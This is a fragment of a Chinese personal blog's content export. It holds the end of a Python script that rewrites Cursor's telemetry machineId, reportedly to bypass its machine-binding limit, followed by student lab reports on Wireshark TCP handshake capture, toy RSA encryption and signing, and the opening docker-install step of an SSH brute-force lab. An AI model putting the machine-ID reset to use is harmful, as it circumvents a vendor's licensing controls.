class="string">&quot;未找到需要备份的文件，跳过备份步骤。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新或创建 JSON 文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_machine_id</span>(<span class="params">file_path, new_id</span>):</span><br><span class="line">    <span class="comment"># 确保目录存在</span></span><br><span class="line">    os.makedirs(os.path.dirname(file_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果文件不存在，创建一个空的 JSON 文件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            json.dump(&#123;&#125;, f)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取 JSON 数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.load(f)</span><br><span class="line">        <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">            data = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新或添加 machineId</span></span><br><span class="line">    data[<span class="string">&quot;telemetry.machineId&quot;</span>] = new_id</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写回更新后的 JSON 文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        json.dump(data, f, indent=<span class="number">4</span>, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;已成功修改 machineId 为: <span class="subst">&#123;new_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    new_id = get_new_id()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建备份</span></span><br><span class="line">    backup_file(storage_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新 JSON 文件</span></span><br><span class="line">    update_machine_id(storage_file, new_id)</span><br></pre></td></tr></table></figure></div>

<p>本代码根据<a class="link"   href="https://blog.csdn.net/Natsuago/article/details/144357008#/" >如何绕过Cursor的机器绑定限制_machineid 已经变了 cursor还是不能用-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>代码进行二创优化</p>
]]></content>
      <categories>
        <category>cursor</category>
      </categories>
      <tags>
        <tag>cursor</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验报告1——Wireshark抓包分析三次握手</title>
    <url>/posts/80a244c8.html</url>
    <content><![CDATA[<h1 id="网络安全原理实验-1——Wireshark-抓包分析三次握手"><a href="#网络安全原理实验-1——Wireshark-抓包分析三次握手" class="headerlink" title="网络安全原理实验 1——Wireshark 抓包分析三次握手"></a>网络安全原理实验 1——Wireshark 抓包分析三次握手</h1><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>我抓的是 QFNU 官网：<a class="link"   href="https://www.qfnu.edu.cn/" >https://www.qfnu.edu.cn/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>找到 IPv6 地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/1/image-20240327112720202.png"
                      alt="image-20240327112720202"
                ></p>
<h2 id="过滤包"><a href="#过滤包" class="headerlink" title="过滤包"></a>过滤包</h2><p>过滤器输入以下内容过滤出 IP 地址的 tcp 协议包</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipv6.addr == 2001:250:581c:608:202:194:186:19 &amp;&amp; tcp</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/1/image-20240327112750144.png"
                      alt="image-20240327112750144"
                ></p>
<h2 id="分析-tcp-包"><a href="#分析-tcp-包" class="headerlink" title="分析 tcp 包"></a>分析 tcp 包</h2><h3 id="第一次握手包"><a href="#第一次握手包" class="headerlink" title="第一次握手包"></a>第一次握手包</h3><h4 id="报文数据"><a href="#报文数据" class="headerlink" title="报文数据"></a>报文数据</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Frame 152: 86 bytes on wire (688 bits), 86 bytes captured (688 bits) on interface \Device\NPF_&#123;2C528628-BD70-46E8-A2DC-6A91B43D20AE&#125;, id 0</span><br><span class="line">Ethernet II, Src: fe:d8:8f:31:3a:50 (fe:d8:8f:31:3a:50), Dst: Intel_1b:a7:9c (84:7b:57:1b:a7:9c)</span><br><span class="line">Internet Protocol Version 6, Src: 2001:250:581c:608:202:194:186:19, Dst: 2409:893d:470e:835f:fce0:9b9d:16ed:e7d9</span><br><span class="line">Transmission Control Protocol, Src Port: 443, Dst Port: 12882, Seq: 0, Ack: 1, Len: 0</span><br><span class="line">    Source Port: 443</span><br><span class="line">    Destination Port: 12882</span><br><span class="line">    [Stream index: 30]</span><br><span class="line">    [Conversation completeness: Complete, WITH_DATA (47)]</span><br><span class="line">    [TCP Segment Len: 0]</span><br><span class="line">    Sequence Number: 0    (relative sequence number)</span><br><span class="line">    Sequence Number (raw): 1574585123</span><br><span class="line">    [Next Sequence Number: 1    (relative sequence number)]</span><br><span class="line">    Acknowledgment Number: 1    (relative ack number)</span><br><span class="line">    Acknowledgment number (raw): 3145687753</span><br><span class="line">    1000 .... = Header Length: 32 bytes (8)</span><br><span class="line">    Flags: 0x012 (SYN, ACK)</span><br><span class="line">        000. .... .... = Reserved: Not set</span><br><span class="line">        ...0 .... .... = Accurate ECN: Not set</span><br><span class="line">        .... 0... .... = Congestion Window Reduced: Not set</span><br><span class="line">        .... .0.. .... = ECN-Echo: Not set</span><br><span class="line">        .... ..0. .... = Urgent: Not set</span><br><span class="line">        .... ...1 .... = Acknowledgment: Set</span><br><span class="line">        .... .... 0... = Push: Not set</span><br><span class="line">        .... .... .0.. = Reset: Not set</span><br><span class="line">        .... .... ..1. = Syn: Set</span><br><span class="line">        .... .... ...0 = Fin: Not set</span><br><span class="line">        [TCP Flags: ·······A··S·]</span><br><span class="line">    Window: 64800</span><br><span class="line">    [Calculated window size: 64800]</span><br><span class="line">    Checksum: 0xea7c [unverified]</span><br><span class="line">    [Checksum Status: Unverified]</span><br><span class="line">    Urgent Pointer: 0</span><br><span class="line">    Options: (12 bytes), Maximum segment size, No-Operation (NOP), No-Operation (NOP), SACK permitted, No-Operation (NOP), Window scale</span><br><span class="line">    [Timestamps]</span><br><span class="line">    [SEQ/ACK analysis]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul>
<li><strong>Ethernet II</strong>：以太网 II 帧格式，包括源 MAC 地址和目的 MAC 地址。<ul>
<li>源 MAC 地址：fe: d8: 8f: 31: 3a: 50</li>
<li>目的 MAC 地址：84: 7b: 57: 1b: a7: 9c</li>
</ul>
</li>
<li>**Internet Protocol Version 6 (IPv6)**：IPv6 协议，包括源 IPv6 地址和目的 IPv6 地址。<ul>
<li>源 IPv6 地址：2001: 250: 581c: 608: 202: 194: 186: 19</li>
<li>目的 IPv6 地址：2409: 893d: 470e: 835f: fce0: 9b9d: 16ed: e7d9</li>
</ul>
</li>
<li>**Transmission Control Protocol (TCP)**：传输控制协议，描述了 TCP 连接的细节。<ul>
<li>源端口号：443</li>
<li>目的端口号：12882</li>
<li>序列号 (Sequence Number)：0</li>
<li>确认号 (Acknowledgment Number)：1</li>
<li>标志 (Flags)：SYN 和 ACK 均置位，表示这是一个带有 SYN 和 ACK 标志的握手包。</li>
<li>窗口大小 (Window Size)：64800</li>
<li>选项 (Options)：最大段大小 (Maximum segment size)，无操作 (NOP)，选择确认(SACK permitted)，无操作 (NOP)，窗口缩放 (Window scale)。</li>
<li>时间戳 (Timestamps)：包含了时间戳选项。</li>
<li>检验和 (Checksum)：0xea7c</li>
</ul>
</li>
</ul>
<h3 id="第二次握手包分析"><a href="#第二次握手包分析" class="headerlink" title="第二次握手包分析"></a>第二次握手包分析</h3><h4 id="报文数据-1"><a href="#报文数据-1" class="headerlink" title="报文数据"></a>报文数据</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">	Frame 153: 74 bytes on wire (592 bits), 74 bytes captured (592 bits) on interface \Device\NPF_&#123;2C528628-BD70-46E8-A2DC-6A91B43D20AE&#125;, id 0</span><br><span class="line">Ethernet II, Src: Intel_1b:a7:9c (84:7b:57:1b:a7:9c), Dst: fe:d8:8f:31:3a:50 (fe:d8:8f:31:3a:50)</span><br><span class="line">Internet Protocol Version 6, Src: 2409:893d:470e:835f:fce0:9b9d:16ed:e7d9, Dst: 2001:250:581c:608:202:194:186:19</span><br><span class="line">Transmission Control Protocol, Src Port: 12882, Dst Port: 443, Seq: 1, Ack: 1, Len: 0</span><br><span class="line">    Source Port: 12882</span><br><span class="line">    Destination Port: 443</span><br><span class="line">    [Stream index: 30]</span><br><span class="line">    [Conversation completeness: Complete, WITH_DATA (47)]</span><br><span class="line">    [TCP Segment Len: 0]</span><br><span class="line">    Sequence Number: 1    (relative sequence number)</span><br><span class="line">    Sequence Number (raw): 3145687753</span><br><span class="line">    [Next Sequence Number: 1    (relative sequence number)]</span><br><span class="line">    Acknowledgment Number: 1    (relative ack number)</span><br><span class="line">    Acknowledgment number (raw): 1574585124</span><br><span class="line">    0101 .... = Header Length: 20 bytes (5)</span><br><span class="line">    Flags: 0x010 (ACK)</span><br><span class="line">        000. .... .... = Reserved: Not set</span><br><span class="line">        ...0 .... .... = Accurate ECN: Not set</span><br><span class="line">        .... 0... .... = Congestion Window Reduced: Not set</span><br><span class="line">        .... .0.. .... = ECN-Echo: Not set</span><br><span class="line">        .... ..0. .... = Urgent: Not set</span><br><span class="line">        .... ...1 .... = Acknowledgment: Set</span><br><span class="line">        .... .... 0... = Push: Not set</span><br><span class="line">        .... .... .0.. = Reset: Not set</span><br><span class="line">        .... .... ..0. = Syn: Not set</span><br><span class="line">        .... .... ...0 = Fin: Not set</span><br><span class="line">        [TCP Flags: ·······A····]</span><br><span class="line">    Window: 512</span><br><span class="line">    [Calculated window size: 131072]</span><br><span class="line">    [Window size scaling factor: 256]</span><br><span class="line">    Checksum: 0x94be [unverified]</span><br><span class="line">    [Checksum Status: Unverified]</span><br><span class="line">    Urgent Pointer: 0</span><br><span class="line">    [Timestamps]</span><br><span class="line">    [SEQ/ACK analysis]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><ol>
<li><strong>帧信息</strong>：<ul>
<li>数据长度：74字节，592位。</li>
<li>源地址（Src）：Intel_1b:a7:9c (84:7b:57:1b:a7:9c)</li>
<li>目标地址（Dst）：fe:d8:8f:31:3a:50</li>
</ul>
</li>
<li><strong>网络协议</strong>：<ul>
<li>IPv6：源IP地址为2409:893d:470e:835f:fce0:9b9d:16ed:e7d9，目标IP地址为2001:250:581c:608:202:194:186:19。</li>
</ul>
</li>
<li><strong>传输层协议</strong>：<ul>
<li>TCP：<ul>
<li>源端口（Src Port）：12882</li>
<li>目标端口（Dst Port）：443</li>
<li>序列号（Sequence Number）：1，表示本次发送的数据段序列号。</li>
<li>确认号（Acknowledgment Number）：1，表示期望接收到的下一个数据段的序列号。</li>
<li>标志（Flags）：ACK（Acknowledgment），表示确认号字段有效。</li>
<li>窗口大小（Window）：512，表示发送端的接收缓冲区大小。</li>
<li>校验和（Checksum）：0x94be。</li>
<li>时间戳（Timestamps）：该选项在此包中未提供具体值。</li>
</ul>
</li>
</ul>
</li>
<li><strong>其他信息</strong>：<ul>
<li>会话完整性（Conversation completeness）：完整，有数据传输。</li>
<li>TCP段长度（TCP Segment Len）：0，表示此包中未包含数据。</li>
</ul>
</li>
</ol>
<h3 id="第三次握手包"><a href="#第三次握手包" class="headerlink" title="第三次握手包"></a>第三次握手包</h3><h4 id="报文数据-2"><a href="#报文数据-2" class="headerlink" title="报文数据"></a>报文数据</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Frame 161: 74 bytes on wire (592 bits), 74 bytes captured (592 bits) on interface \Device\NPF_&#123;2C528628-BD70-46E8-A2DC-6A91B43D20AE&#125;, id 0</span><br><span class="line">Ethernet II, Src: fe:d8:8f:31:3a:50 (fe:d8:8f:31:3a:50), Dst: Intel_1b:a7:9c (84:7b:57:1b:a7:9c)</span><br><span class="line">Internet Protocol Version 6, Src: 2001:250:581c:608:202:194:186:19, Dst: 2409:893d:470e:835f:fce0:9b9d:16ed:e7d9</span><br><span class="line">Transmission Control Protocol, Src Port: 443, Dst Port: 12881, Seq: 1, Ack: 808, Len: 0</span><br><span class="line">    Source Port: 443</span><br><span class="line">    Destination Port: 12881</span><br><span class="line">    [Stream index: 31]</span><br><span class="line">    [Conversation completeness: Complete, WITH_DATA (47)]</span><br><span class="line">    [TCP Segment Len: 0]</span><br><span class="line">    Sequence Number: 1    (relative sequence number)</span><br><span class="line">    Sequence Number (raw): 839341445</span><br><span class="line">    [Next Sequence Number: 1    (relative sequence number)]</span><br><span class="line">    Acknowledgment Number: 808    (relative ack number)</span><br><span class="line">    Acknowledgment number (raw): 1312419164</span><br><span class="line">    0101 .... = Header Length: 20 bytes (5)</span><br><span class="line">    Flags: 0x010 (ACK)</span><br><span class="line">        000. .... .... = Reserved: Not set</span><br><span class="line">        ...0 .... .... = Accurate ECN: Not set</span><br><span class="line">        .... 0... .... = Congestion Window Reduced: Not set</span><br><span class="line">        .... .0.. .... = ECN-Echo: Not set</span><br><span class="line">        .... ..0. .... = Urgent: Not set</span><br><span class="line">        .... ...1 .... = Acknowledgment: Set</span><br><span class="line">        .... .... 0... = Push: Not set</span><br><span class="line">        .... .... .0.. = Reset: Not set</span><br><span class="line">        .... .... ..0. = Syn: Not set</span><br><span class="line">        .... .... ...0 = Fin: Not set</span><br><span class="line">        [TCP Flags: ·······A····]</span><br><span class="line">    Window: 501</span><br><span class="line">    [Calculated window size: 64128]</span><br><span class="line">    [Window size scaling factor: 128]</span><br><span class="line">    Checksum: 0x220d [unverified]</span><br><span class="line">    [Checksum Status: Unverified]</span><br><span class="line">    Urgent Pointer: 0</span><br><span class="line">    [Timestamps]</span><br><span class="line">    [SEQ/ACK analysis]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><ol>
<li><p><strong>帧信息</strong>：</p>
<ul>
<li>数据长度：74字节，592位。</li>
<li>源地址（Src）：fe:d8:8f:31:3a:50</li>
<li>目标地址（Dst）：Intel_1b:a7:9c (84:7b:57:1b:a7:9c)</li>
</ul>
</li>
<li><p><strong>网络协议</strong>：</p>
<ul>
<li>IPv6：源IP地址为2001:250:581c:608:202:194:186:19，目标IP地址为2409:893d:470e:835f:fce0:9b9d:16ed:e7d9。</li>
</ul>
</li>
<li><p><strong>传输层协议</strong>：</p>
<ul>
<li>TCP：<ul>
<li>源端口（Src Port）：443</li>
<li>目标端口（Dst Port）：12881</li>
<li>序列号（Sequence Number）：1，表示本次发送的数据段序列号。</li>
<li>确认号（Acknowledgment Number）：808，表示接收到的下一个期望的数据段序列号。</li>
<li>标志（Flags）：ACK（Acknowledgment），表示确认号字段有效。</li>
<li>窗口大小（Window）：501，表示发送端的接收缓冲区大小。</li>
<li>校验和（Checksum）：0x220d。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>其他信息</strong>：</p>
<ul>
<li>会话完整性（Conversation completeness）：完整，有数据传输。</li>
<li>TCP段长度（TCP Segment Len）：0，表示此包中未包含数据。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>网络安全原理实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全原理实验2——RSA算法实现与测试</title>
    <url>/posts/232a9003.html</url>
    <content><![CDATA[<h1 id="网络安全原理实验-2——RSA-算法实现与测试"><a href="#网络安全原理实验-2——RSA-算法实现与测试" class="headerlink" title="网络安全原理实验 2——RSA 算法实现与测试"></a>网络安全原理实验 2——RSA 算法实现与测试</h1><h2 id="【目的】"><a href="#【目的】" class="headerlink" title="【目的】"></a>【目的】</h2><p>让学员通过该实验的练习主要掌握：</p>
<ul>
<li>实现 RSA 密码算法</li>
</ul>
<h2 id="【环境】"><a href="#【环境】" class="headerlink" title="【环境】"></a>【环境】</h2><p>操作机：Ubuntu18.04</p>
<h2 id="【工具】"><a href="#【工具】" class="headerlink" title="【工具】"></a>【工具】</h2><p>编辑软件：gedit - Version 3.36.2</p>
<p>编译器：gcc (Ubuntu 9.3.0-17ubuntu1~18.04) 9.3.0</p>
<blockquote>
<p>我用 Python 写的，开虚拟机，开 C 语言环境太慢了</p>
</blockquote>
<h2 id="【源码】"><a href="#【源码】" class="headerlink" title="【源码】"></a>【源码】</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">r, x, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算 x 的 r 次方模 n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = x</span><br><span class="line">    b = r</span><br><span class="line">    c = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">while</span> b % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            b = b // <span class="number">2</span></span><br><span class="line">            a = (a * a) % n</span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            b = b - <span class="number">1</span></span><br><span class="line">            c = (c * a) % n</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Enclid</span>(<span class="params">n, d</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算模逆运算</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = n</span><br><span class="line">    b = d</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    v = <span class="number">1</span></span><br><span class="line">    w = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = a % b</span><br><span class="line">        <span class="keyword">if</span> r != <span class="number">0</span>:</span><br><span class="line">            q = (a - r) // b</span><br><span class="line">            a = b</span><br><span class="line">            b = r</span><br><span class="line">            w = v</span><br><span class="line">            v = t - q * v</span><br><span class="line">            t = w</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> v &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> v</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> n + v</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算最大公约数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    r = a % b</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = a % b</span><br><span class="line">        <span class="keyword">if</span> r != <span class="number">0</span>:</span><br><span class="line">            a = b</span><br><span class="line">            b = r</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    RSA 加密算法</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 输入两个素数 p、q</span></span><br><span class="line">    p = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入两个素数:(p、q)\n&quot;</span>))</span><br><span class="line">    q = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    n = p * q  <span class="comment"># 计算 n</span></span><br><span class="line">    fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 计算 φ(n)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入 e，并确保 gcd(fn, e) = 1</span></span><br><span class="line">    e = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入e:\n&quot;</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> gcd(fn, e) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            e = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;必须满足gcd(fn,e)=1\n&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算 d</span></span><br><span class="line">    d = Enclid(fn, e)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出公钥和私钥</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;出错了!\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;公钥(%d,%d)\n&quot;</span> % (e, fn))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;私钥:(%d,%d)\n&quot;</span> % (d, fn))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输入明文 m，并确保 m &lt; p * q</span></span><br><span class="line">        m = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enc: 输入明文:\n&quot;</span>))</span><br><span class="line">        <span class="keyword">while</span> m &gt;= p * q:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;错误！明文需要小于p*q=%d!\n&quot;</span> % (p * q))</span><br><span class="line">            m = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 加密并输出密文</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密文:%d\n&quot;</span> % f(e, m, n))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解密并输出明文</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;解密:m=%d\n&quot;</span> % f(d, f(e, m, n), n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;RSA加密算法\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;姓名: W1ndys\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;学号: 10000001\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rsa()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;按Ctrl+C退出&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="【运行截图】"><a href="#【运行截图】" class="headerlink" title="【运行截图】"></a>【运行截图】</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/2-RSA/image-20240403103313875.png"
                      alt="image-20240403103313875"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全原理实验报告</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全原理实验3——RSA签名实现</title>
    <url>/posts/6e83b201.html</url>
    <content><![CDATA[<h1 id="网络安全原理实验-3——RSA-签名实现"><a href="#网络安全原理实验-3——RSA-签名实现" class="headerlink" title="网络安全原理实验 3——RSA 签名实现"></a>网络安全原理实验 3——RSA 签名实现</h1><h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>RSA 加密是一种非对称加密。可以在不直接传递密钥的情况下，完成解密。这能够确保信息的安全性，避免了直接传递密钥所造成的被破解的风险。是由一对密钥来进行加解密的过程，分别称为公钥和私钥。两者之间有数学相关，该加密算法的原理就是对一极大整数做因数分解的困难性来保证安全性。通常个人保存私钥，公钥是公开的（可能同时多人持有）。</p>
<p>RSA 签名的过程如下：</p>
<p>（1）A 生成一对密钥（公钥和私钥），私钥不公开，A 自己保留。公钥为公开的，任何人可以获取。</p>
<p>（2）A 用自己的私钥对消息加签，形成签名，并将加签的消息和消息本身一起传递给 B。</p>
<p>（3）B 收到消息后，在获取 A 的公钥进行验签，如果验签出来的内容与消息本身一致，证明消息是 A 回复的。</p>
<p>在这个过程中，只有 2 次传递过程，第一次是 A 传递加签的消息和消息本身给 B，第二次是 B 获取 A 的公钥，即使都被敌方截获，也没有危险性，因为只有 A 的私钥才能对消息进行签名，即使知道了消息内容，也无法伪造带签名的回复给 B，防止了消息内容的篡改。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">m, e, n</span>):</span><br><span class="line">    temp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">while</span> temp &lt; n <span class="keyword">and</span> e &gt;= <span class="number">1</span>:</span><br><span class="line">            temp = temp * m</span><br><span class="line">            e = e - <span class="number">1</span></span><br><span class="line">        temp = temp % n</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    n = <span class="number">55</span></span><br><span class="line">    d = <span class="number">3</span>  <span class="comment"># d为私公钥13</span></span><br><span class="line">    e = <span class="number">27</span>  <span class="comment"># e为私钥</span></span><br><span class="line">    m = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入待签名的消息：\n&quot;</span>))  <span class="comment"># 将输入转换为整数</span></span><br><span class="line">    ms = func(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;签名后的消息：&quot;</span>, ms)</span><br><span class="line">    vms = func(ms, d, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;验证签名后的消息：&quot;</span>, vms)</span><br><span class="line">    <span class="keyword">if</span> vms == m:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;签名验证成功！&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="实验截图"><a href="#实验截图" class="headerlink" title="实验截图"></a>实验截图</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/3-RSA/image-20240410104552422.png"
                      alt="image-20240410104552422"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全原理实验报告</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验报告4——SSH暴力破解实验</title>
    <url>/posts/97781668.html</url>
    <content><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>虚拟机：Kali_Linux_VMware_Workstation_16_Player_Edition<br>工具：FoxyProxy、BurpSuit</p>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="安装-docker"><a href="#安装-docker" class="headerlink" title="安装 docker"></a>安装 docker</h2><ol>
<li><p>打开 Kali Linux，在终端输入以下命令安装 docker：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker.io</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>检查安装是否成功：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/4-DVWA/image.png"
                      alt="docker安装成功"
                ></p>
</li>
</ol>
